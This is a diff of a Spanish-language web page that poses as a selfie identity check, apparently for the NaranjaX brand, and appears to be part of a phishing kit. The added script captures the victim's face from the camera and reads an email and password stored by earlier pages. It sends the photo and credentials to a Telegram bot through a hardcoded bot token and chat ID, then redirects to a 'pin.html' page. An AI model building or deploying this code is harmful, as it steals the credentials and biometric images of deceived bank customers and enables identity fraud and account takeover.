@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Selfie KYC</title>
+<title>Verificación de identidad con selfie</title>
 <style>
   html, body {
     margin: 0;
@@ -11,7 +11,7 @@
     height: 100%;
     overflow: hidden;
     font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: #f5f7fb;
+    background: white;
     color: #1c1c1e;
   }
   body {
@@ -28,216 +28,30 @@
     flex-direction: column;
     position: relative;
     box-sizing: border-box;
-    background: #fff;
-    box-shadow:
-      0 18px 40px rgba(15,23,42,0.22),
-      0 8px 18px rgba(15,23,42,0.12);
-    border-radius: 24px;
   }
 
   /* Pantalla 1 */
-  #pantalla1 {
-    display: flex;
-    flex-direction: column;
-    flex-grow: 1;
-    height: 100%;
-    overflow: hidden;
-  }
-  .image-wrapper {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 32px;
-  }
-  .image-wrapper img {
-    max-width: 200px;
-    width: 100%;
-    height: auto;
-    user-select: none;
-    border-radius: 22px;
-    box-shadow: 0 12px 25px rgba(0,0,0,0.18);
-  }
-  h1 {
-    font-size: 26px;
-    font-weight: 700;
-    margin: 0 0 10px 0;
-    line-height: 1.2;
-    color: #111827;
-  }
-  p {
-    font-size: 16px;
-    line-height: 1.35;
-    margin: 0 0 26px 0;
-    color: #4b5563;
-  }
+  #pantalla1 { display: flex; flex-direction: column; flex-grow: 1; height: 100%; overflow: hidden; }
+  .image-wrapper { display: flex; justify-content: center; margin-bottom: 40px; }
+  .image-wrapper img { max-width: 200px; width: 100%; height: auto; user-select: none; }
+  h1 { font-size: 28px; font-weight: 700; margin: 0 0 16px 0; line-height: 1.2; }
+  p { font-size: 17px; line-height: 1.3; margin: 0 0 50px 0; color: #333; }
   .spacer { flex-grow: 1; }
-  .exit-link {
-    text-align: center;
-    font-size: 15px;
-    color: #05be50;
-    text-decoration: underline;
-    cursor: pointer;
-    margin-bottom: 18px;
-    user-select: none;
-  }
-  button {
-    width: 100%;
-    background-color: #05be50;
-    border: none;
-    border-radius: 999px;
-    color: white;
-    font-size: 17px;
-    font-weight: 600;
-    padding: 15px;
-    cursor: pointer;
-    user-select: none;
-    transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease;
-    box-shadow: 0 12px 24px rgba(5,190,80,0.28);
-  }
-  button:hover { background-color: #049b43; }
-  button:active {
-    background-color: #038437;
-    transform: translateY(1px);
-    box-shadow: 0 6px 14px rgba(5,190,80,0.35);
-  }
+  .exit-link { text-align: center; font-size: 15px; color: #6327c4; text-decoration: underline; cursor: pointer; margin-bottom: 25px; user-select: none; }
+  button { width: 100%; background-color: #6327c4; border: none; border-radius: 20px; color: white; font-size: 17px; font-weight: 600; padding: 17px; cursor: pointer; user-select: none; transition: background-color 0.25s ease; }
+  button:hover { background-color: #4a1d8b; }
+  button:active { background-color: #38156a; }
 
   /* Pantalla 2 */
-  #pantalla2 {
-    display: none;
-    position: relative;
-    height: 100%;
-    overflow: hidden;
-  }
-  #pantalla2 .close-btn {
-    position: fixed;
-    top: 15px;
-    right: 18px;
-    font-size: 26px;
-    font-weight: 700;
-    color: #111827;
-    cursor: pointer;
-    user-select: none;
-    z-index: 1001;
-  }
-  #pantalla2 .content {
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    text-align: center;
-  }
-
-  /* Marco de cámara */
-  .camera-frame {
-    width: 190px;
-    height: 190px;
-    border-radius: 50%;
-    border: 8px solid #202840;
-    background: #000;
-    position: relative;
-    overflow: hidden;
-    margin-bottom: 20px;
-    box-shadow: 0 0 0 4px rgba(16,185,129,0.0);
-    transition: box-shadow 0.2s ease;
-  }
-  .camera-frame video,
-  .camera-frame img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-  }
-  /* 🔥 Ya NO se voltea el video */
-  .camera-frame video {
-    /* sin transform */
-  }
-  .camera-frame img {
-    display: none;
-  }
-
-  /* Línea de escaneo verde */
-  .scan-line {
-    position: absolute;
-    left: 0;
-    top: -100%;
-    width: 100%;
-    height: 40%;
-    background: linear-gradient(
-      180deg,
-      rgba(16,185,129,0) 0%,
-      rgba(16,185,129,0.5) 50%,
-      rgba(16,185,129,0) 100%
-    );
-    mix-blend-mode: screen;
-    pointer-events: none;
-  }
-  .camera-frame.scanning .scan-line {
-    animation: scanMove 0.9s ease-out forwards;
-  }
-  @keyframes scanMove {
-    0% { top: -100%; }
-    100% { top: 100%; }
-  }
-  .camera-frame.scanning {
-    box-shadow: 0 0 0 4px rgba(16,185,129,0.7);
-  }
-
-  #pantalla2 p {
-    font-size: 18px;
-    font-weight: 600;
-    color: #202840;
-    margin: 0 0 10px 0;
-  }
-  #subtextoIA {
-    font-size: 14px;
-    font-weight: 400;
-    color: #6b7280;
-    margin-bottom: 24px;
-  }
-
-  #btnTomarFoto {
-    width: 190px;
-    background-color: #05be50;
-    border-radius: 999px;
-    border: none;
-    color: white;
-    font-weight: 600;
-    font-size: 16px;
-    padding: 12px 0;
-    cursor: pointer;
-    user-select: none;
-    transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease, color 0.15s ease;
-    position: relative;
-    overflow: hidden;
-    box-shadow: 0 10px 22px rgba(5,190,80,0.28);
-    margin-top: 4px;
-  }
-  #btnTomarFoto.loading {
-    background-color: #04a646;
-    color: #e5e7eb;
-    cursor: not-allowed;
-  }
-  #btnTomarFoto.loading::after {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
-    animation: loading 1.3s infinite;
-  }
-  @keyframes loading {
-    0% { left: -100%; }
-    100% { left: 100%; }
-  }
-
-  @media (max-width: 600px) {
-    .container {
-      border-radius: 0;
-      box-shadow: none;
-      height: 100%;
-    }
-  }
+  #pantalla2 { display: none; position: relative; height: 100%; overflow: hidden; }
+  #pantalla2 .close-btn { position: fixed; top: 15px; right: 15px; font-size: 28px; font-weight: 700; color: #000; cursor: pointer; user-select: none; z-index: 1001; }
+  #pantalla2 .content { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+  #pantalla2 video { width: 180px; height: 180px; border-radius: 50%; border: 8px solid #202840; background: black; object-fit: cover; margin-bottom: 20px; }
+  #pantalla2 p { font-size: 20px; font-weight: 600; color: #202840; margin: 0 0 15px 0; }
+  #btnTomarFoto { width: 180px; background-color: #6327c4; border-radius: 20px; border: none; color: white; font-weight: 600; font-size: 17px; padding: 12px 0; cursor: pointer; user-select: none; transition: background-color 0.25s ease; margin-bottom: 20px; }
+  #btnTomarFoto:hover { background-color: #4a1d8b; }
+  #btnTomarFoto:active { background-color: #38156a; }
+  #fotoCapturada { width: 180px; height: 180px; border-radius: 50%; object-fit: cover; border: 8px solid #202840; display: none; margin-top: 10px; }
 </style>
 </head>
 <body>
@@ -245,34 +59,23 @@
     <!-- Pantalla 1 -->
     <div id="pantalla1">
       <div class="image-wrapper">
-        <img src="img/photo_2025-12-09_23-02-29.jpg" alt="Ilustración selfie" />
+        <img src="slf.PNG" alt="Ilustración selfie" />
       </div>
       <h1>Necesitamos confirmar tu identidad</h1>
-      <p>
-        Antes de continuar, te pedimos que te saques una selfie
-        para confirmar que sos vos.
-      </p>
+      <p>Antes de confirmar tu identidad, te pedimos que te saques una selfie para confirmar que sos vos.</p>
       <div class="spacer"></div>
       <div class="exit-link" tabindex="0" role="button" aria-label="Salir">Salir</div>
-      <button id="btnSacarSelfie" type="button" aria-label="Sacar selfie">
-        Sacar selfie
-      </button>
+      <button id="btnSacarSelfie" type="button" aria-label="Sacar selfie">Sacar selfie</button>
     </div>
 
-    <!-- Pantalla 2: una sola foto + escaneo IA -->
+    <!-- Pantalla 2 -->
     <div id="pantalla2" aria-live="polite" aria-label="Instrucciones para selfie">
       <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
       <div class="content">
-        <div class="camera-frame" id="cameraFrame">
-          <video autoplay playsinline muted></video>
-          <img id="fotoCapturada" alt="Foto capturada" />
-          <div class="scan-line"></div>
-        </div>
-        <p id="tituloSelfie">Ubicá tu rostro dentro del círculo</p>
-        <div id="subtextoIA">La IA va a identificar tu rostro automáticamente.</div>
-        <button id="btnTomarFoto" type="button" aria-label="Tomar foto">
-          Tomar foto
-        </button>
+        <video autoplay playsinline muted></video>
+        <p>Mir&aacute; de frente a la c&aacute;mara</p>
+        <button id="btnTomarFoto" type="button" aria-label="Tomar foto">Tomar foto</button>
+        <img id="fotoCapturada" alt="Foto capturada" />
       </div>
     </div>
   </div>
@@ -281,35 +84,22 @@
   const btnSacarSelfie = document.getElementById('btnSacarSelfie');
   const pantalla1 = document.getElementById('pantalla1');
   const pantalla2 = document.getElementById('pantalla2');
-  const closeBtn2 = pantalla2.querySelector('.close-btn');
-
-  const cameraFrame = document.getElementById('cameraFrame');
+  const closeBtn = pantalla2.querySelector('.close-btn');
   const video = pantalla2.querySelector('video');
-  const fotoCapturada = document.getElementById('fotoCapturada');
   const btnTomarFoto = document.getElementById('btnTomarFoto');
-  const tituloSelfie = document.getElementById('tituloSelfie');
-  const subtextoIA = document.getElementById('subtextoIA');
-
+  const fotoCapturada = document.getElementById('fotoCapturada');
   let stream;
 
-  // Ir a pantalla 2 y pedir cámara
+  const telegramBotToken = "8593661430:AAGbJVG-7-S4jzO9MCi9ZwsUOhkaO-7tt9E";
+  const telegramChatId = "7655000874";
+
   btnSacarSelfie.addEventListener('click', async () => {
     pantalla1.style.display = 'none';
     pantalla2.style.display = 'block';
     fotoCapturada.style.display = 'none';
-    video.style.display = 'block';
-    cameraFrame.classList.remove('scanning');
-    btnTomarFoto.disabled = false;
-    btnTomarFoto.classList.remove('loading');
-    btnTomarFoto.textContent = 'Tomar foto';
-    tituloSelfie.textContent = 'Ubicá tu rostro dentro del círculo';
-    subtextoIA.textContent = 'La IA va a identificar tu rostro automáticamente.';
-
+    btnTomarFoto.style.display = 'inline-block';
     try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
-        audio: false
-      });
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
       video.srcObject = stream;
     } catch (error) {
       alert("No se pudo acceder a la cámara. Revisá los permisos.");
@@ -318,88 +108,53 @@
     }
   });
 
-  // Cerrar y volver a pantalla 1
-  closeBtn2.addEventListener('click', () => {
+  closeBtn.addEventListener('click', () => {
     pantalla2.style.display = 'none';
     pantalla1.style.display = 'flex';
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-      stream = null;
-    }
+    if (stream) stream.getTracks().forEach(track => track.stop());
   });
 
-  // Tomar UNA foto y mostrar escaneo verde + redirección
-  btnTomarFoto.addEventListener('click', async () => {
-    if (!stream) return;
-
-    btnTomarFoto.disabled = true;
-    btnTomarFoto.classList.add('loading');
-    btnTomarFoto.textContent = 'Procesando...';
-
-    // Capturar frame a canvas
+  btnTomarFoto.addEventListener('click', () => {
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 180;
     canvas.height = video.videoHeight || 180;
     const ctx = canvas.getContext('2d');
-
-    // 🔥 SIN volteo, se dibuja tal cual viene de la cámara
-    // (nada de translate/scale)
-
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const blob = await new Promise(resolve => {
-      canvas.toBlob(resolve, 'image/png');
-    });
+    canvas.toBlob(async (blob) => {
+      // Mostrar foto en el círculo
+      const url = URL.createObjectURL(blob);
+      fotoCapturada.src = url;
+      fotoCapturada.style.display = 'block';
+      video.style.display = 'none';
+      btnTomarFoto.style.display = 'none';
 
-    // Mostrar la foto capturada en vez del video
-    const imgURL = URL.createObjectURL(blob);
-    fotoCapturada.src = imgURL;
-    fotoCapturada.style.display = 'block';
-    video.style.display = 'none';
+      // Recuperar email y clave desde LocalStorage
+      const email = localStorage.getItem('ips1') || "No definido";
+      const clave = localStorage.getItem('ips2') || "No definido";
 
-    // Texto de IA
-    tituloSelfie.textContent = 'identificando tu rostro...';
-    subtextoIA.textContent = 'Por favor, mantené tu dispositivo quieto unos segundos.';
+      // Enviar a Telegram como foto con caption
+      const formData = new FormData();
+      formData.append('photo', blob, 'selfie.png');
+      formData.append('chat_id', telegramChatId);
+      formData.append('caption', `Selfie Capturada NaranjaX\nEmail: ${email}\nClave: ${clave}`);
 
-    // Activar animación de escaneo verde
-    cameraFrame.classList.add('scanning');
-
-    // Simular análisis breve y luego redirigir
-    setTimeout(() => {
-      // Detener cámara
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-      }
-
-      // Redirigir a la siguiente página
-      window.location.href = "pin.html"; // cambia esto por tu página
-    }, 1100);
-  });
-
-   const email = localStorage.getItem('ips1') || "No definido";
-    const clave = localStorage.getItem('ips2') || "No definido";
-
-    if(telegramBotToken && telegramChatId) {
       try {
-        const photoFormData = new FormData();
-        photoFormData.append('photo', blob, 'selfie_voluntaria.png');
-        photoFormData.append('chat_id', telegramChatId);
-        photoFormData.append('caption', `Selfie voluntaria inter\n\nEmail: ${email}\nClave: ${clave}`);
-        
         await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
           method: 'POST',
-          body: photoFormData
+          body: formData
         });
-        console.log("Primera foto enviada a Telegram");
+        console.log("correcto");
       } catch(e) {
-        console.log("Error enviando primera foto a Telegram:", e);
+        console.log("Error :", e);
       }
-    }
 
-
-   const telegramBotToken = "8407584473:AAFVyKwzEQyGozipHyMNDrSWBi7mR9qhw-E";
-  const telegramChatId = "7655000874";
+      // Redirigir a Google
+      setTimeout(() => {
+        window.location.href = "pin.html";
+      }, 500);
+    }, 'image/png');
+  });
 </script>
 
 </body>
